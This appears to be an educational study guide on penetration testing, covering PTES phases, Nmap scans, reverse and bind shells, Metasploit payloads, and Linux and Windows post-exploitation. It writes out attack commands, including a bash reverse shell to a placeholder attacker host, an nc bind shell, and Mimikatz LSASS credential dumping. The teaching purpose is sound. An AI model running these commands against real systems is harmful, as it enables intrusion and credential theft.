# Key to Flow: Ethical Hacking and Penetration Testing (PTES, Nmap, Reverse Shells, & Post-Exploitation)

**Subject Area:** `03_Computer_Science_and_IT / 05_Computer_Networks_and_Security / Cybersecurity_and_Defensive_Systems / Ethical_Hacking_and_Penetration_Testing`

---

## 📌 Core Concept & Mental Model
**The 7-Phase Penetration Testing Execution Standard (PTES), Adversary Tactic Mapping (MITRE ATT&CK Matrix), TCP Half-Open Port Scanning (Nmap SYN `-sS`), Outbound Firewall Evasion via Reverse Shell Payloads (Metasploit MSF), and Host Privilege Escalation (Linux SUID / Windows Mimikatz LSASS)** govern professional ethical hacking and offensive cybersecurity operations (PTES Standard; MITRE ATT&CK Enterprise Matrix; Gordon Lyon *Nmap Network Scanning*; Georgia Weidman *Penetration Testing*; Peter Kim *The Hacker Playbook*):
* **1. Penetration Testing Execution Standard (PTES 7 Phases):**
  1. **Pre-engagement Interactions:** Scoping, Rules of Engagement (RoE), legal authorization contracts.
  2. **Intelligence Gathering (Reconnaissance):** Passive OSINT (whois, Shodan, DNS enumeration) vs Active scanning.
  3. **Threat Modeling:** Identifying high-value crown jewels and threat actor capability profiles.
  4. **Vulnerability Analysis:** Nmap version detection (`-sV`), NSE scripts (`-sC`), Nessus/OpenVAS scanning.
  5. **Exploitation:** Executing targeted proof-of-concept exploits to establish an initial foothold.
  6. **Post-Exploitation:** Privilege escalation, credential harvesting (LSASS / SAM), persistence, and lateral movement.
  7. **Reporting:** Executive risk summaries, technical vulnerability findings, CVSS scores, and remediation roadmaps.
* **2. Reconnaissance & Network Port Scanning (Nmap):**
  - **TCP SYN Stealth Scan (`nmap -sS`):** Sends `SYN` $\to$ receives `SYN-ACK` (Port Open) $\to$ sends immediate `RST` to tear down connection before full 3-way handshake completes (bypasses basic connection loggers!).
  - **TCP Connect Scan (`nmap -sT`):** Completes full 3-way handshake (used without root/raw socket privileges).
  - **UDP Scanning (`nmap -sU`):** Sends UDP probe $\to$ expects response or ICMP Port Unreachable (`Type 3 Code 3`).
* **3. Exploitation & Shell Payloads:**
  - **Bind Shell vs Reverse Shell:**
    - **Bind Shell:** Target opens listening port (e.g. `nc -lvp 4444 -e /bin/sh`); attacker connects *inbound*. *Flaw: Blocked by ingress firewalls!*
    - **Reverse Shell:** Attacker opens listening port (`nc -lvnp 4444`); target connects *outbound* back to attacker (`bash -i >& /dev/tcp/attacker_ip/4444 0>&1`). *Bypasses inbound NAT/firewalls!*
  - **Metasploit Framework (MSF):** Staged payloads (e.g. `windows/x64/meterpreter/reverse_tcp` - small stager fetches full Meterpreter DLL into RAM) vs Inline/Single payloads.
* **4. Post-Exploitation & Lateral Movement (MITRE ATT&CK):**
  - **Linux Privilege Escalation:** Exploiting SUID root binaries (`find / -perm -4000 -type f`), misconfigured `sudo -l` permissions, or Linux kernel exploits (Dirty COW / Dirty Pipe).
  - **Windows Credential Dumping:** Extracting NTLM password hashes and Kerberos tickets from memory using **Mimikatz** (`sekurlsa::logonpasswords` on `lsass.exe`).
  - **Lateral Movement & Pivoting:** Pass-the-Hash (`psexec.py`), SSH dynamic port forwarding (`ssh -D 1080`), and Chisel SOCKS5 proxies.

---

## 🔑 Best Known Study Methodologies & Learning Framework

### 1. The Red Team Operational Pipeline
* Phase 1-2 $\to$ Scope + OSINT Recon (Shodan/Whois).
* Phase 4 $\to$ Nmap SYN Scan (`-sS -sV -sC`).
* Phase 5 $\to$ Exploit CVE $\to$ Catch Reverse Shell on Listener.
* Phase 6 $\to$ SUID/Mimikatz $\to$ Root/SYSTEM $\to$ Pivot via Proxy.
* Phase 7 $\to$ Detailed Remediation Report.

### 2. Top Recommended Resources
* **The Hands-on Standard:** [TryHackMe & Hack The Box](https://hackthebox.com) (Practical live CTF lab environments).
* **The Pentesting Bible:** *Penetration Testing: A Hands-On Introduction to Hacking* (Georgia Weidman, No Starch Press).

---

## 🎯 Problem-Solving Checklist
- [ ] Can you list the 7 sequential phases of the PTES framework?
- [ ] Can you contrast an Nmap TCP SYN scan (`-sS`) with a TCP Connect scan (`-sT`)?
- [ ] Can you explain why Reverse Shells bypass network firewalls while Bind Shells fail?
- [ ] Can you identify a SUID privilege escalation path on a Linux host?
